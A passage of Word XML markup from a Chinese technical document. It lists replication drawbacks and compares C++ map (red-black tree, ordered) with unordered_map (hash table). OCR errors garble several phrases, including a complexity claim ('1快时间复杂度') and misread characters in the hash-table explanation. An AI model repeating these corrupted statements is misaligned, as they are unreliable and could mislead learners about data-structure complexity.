          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Master</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的角色提升。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>缺点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="730"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="152" w:name="bookmark161"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="152"/>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资源隔离性较差，容易出现相互影响的情况。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="745"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="153" w:name="bookmark162"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="153"/>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数据通过异步复制，不保证数据的强一致性</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="633"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="154" w:name="bookmark165"/>
      <w:bookmarkEnd w:id="154"/>
      <w:bookmarkStart w:id="155" w:name="bookmark163"/>
      <w:bookmarkStart w:id="156" w:name="bookmark164"/>
      <w:bookmarkStart w:id="157" w:name="bookmark166"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>类与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>nordered map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="3A271E"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>类的区别</w:t>
      </w:r>
      <w:bookmarkEnd w:id="155"/>
      <w:bookmarkEnd w:id="156"/>
      <w:bookmarkEnd w:id="157"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="700"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="158" w:name="bookmark167"/>
      <w:bookmarkEnd w:id="158"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">map </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>类:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="120"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是一种容器，内部元素由键值对组成，键与值的数据类型可以不同，键的值是唯 一的（此处的值不是键值对中的值），用二自动排序数据值，排序方式是根据某种明确、 严格的弱排序标准进行的，这种排序标准是由</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>内部的比较对象（即</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">map： ：key_comp） </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>指定的。使用时要引入#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;map&gt;o</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在键</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>一一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>值这个映射关系中，元素数据值是可以更改的，但键值是常量，一旦确定无 法随意更改。必须先删除与旧元素关联的键值，才能为新元素插入新键值。</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>实现机理：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>内部实现了一个红黑树（红黑树是非严格平衡二叉搜索树，而</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>AVL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是 严格平衡二叉搜索树），红黑树具有自动排序的功能，因此</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>内部的所有元素都是有 序的，红黑树的每一个节点都代表着</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的一个元素。因此，对于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>进行的查找，删 除，添加等一系列的操作都相当于是对红黑树进行的操作。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中的元素是按照二叉搜 索树（又名二叉查找树、二叉排序树，特点就是左子树上所有节点的键值都小于根节点 的键值，右子树所有节点的键值都大于根节点的键值）存储的，使用中序遍历可将键值 按照从小到大遍历出来。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>特性：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1165"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="440"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="159" w:name="bookmark168"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="159"/>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有序性。这是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>类最大的优点，许多时候有序性可以省去很多麻烦，较为适 合处理有顺序要求的问题；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1185"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="160" w:name="bookmark169"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:bookmarkEnd w:id="160"/>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唯一性。因为每个元素必须具有唯一的键值；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1195"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="440"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="161" w:name="bookmark170"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:bookmarkEnd w:id="161"/>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红黑树。红黑树的结构使得效率提高，许多操作可以在1快时间复杂度下完成, 但也正是该结构使得空间利用率较高，冬个节点都要保存相应的父节点与子节点等；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="715"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="162" w:name="bookmark171"/>
      <w:bookmarkEnd w:id="162"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">unor der e d_map </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>类:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>unordered.map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是无序的，是用来替代</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hash_map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>类的，也是使用键值对来存储数据， 但是这个数据是无序的，允许通过键值直接访问元素（在常数时间。（1）内）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="120"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>实现机理：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>unordered-map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>内部实现了一个哈希表（也叫散列表，通过把关键码值映 射到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>表中一个位罷来访问记录）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>（哈杀表是一个在时间和空间上偷出权.衝的经 典例子。如果没有内存限制，那么可以直接将键作为数组的索引。那么所有的查找时间 复杂度为0（1）；如果没有时间限制，那么我们可以使用无序数组并进行顺序查找，这 样只需要很少的内存。哈希表使用了适度的时间和空间来在这两个极端之间找到了平 復只需要调整哈希函数算法即可在时间和空间上做出职舍。）</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>特点：哈希表的存在使得查找速度极快〔常数时间。（1））,但是哈希表的建立较为消 耗时间较为适合处理查找问题；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>总结：哈希表较红黑树的空间占用率较高，但是执行效率要高于红黑树。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1040" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>虽然</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>unordered_map</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是无序排列的，但是其遍历顺序与元素插入顺序是不</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>同的.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="380" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="163" w:name="bookmark174"/>
      <w:bookmarkEnd w:id="163"/>
      <w:bookmarkStart w:id="164" w:name="bookmark172"/>
      <w:bookmarkStart w:id="165" w:name="bookmark173"/>
      <w:bookmarkStart w:id="166" w:name="bookmark175"/>
      <w:r>
        <w:rPr>
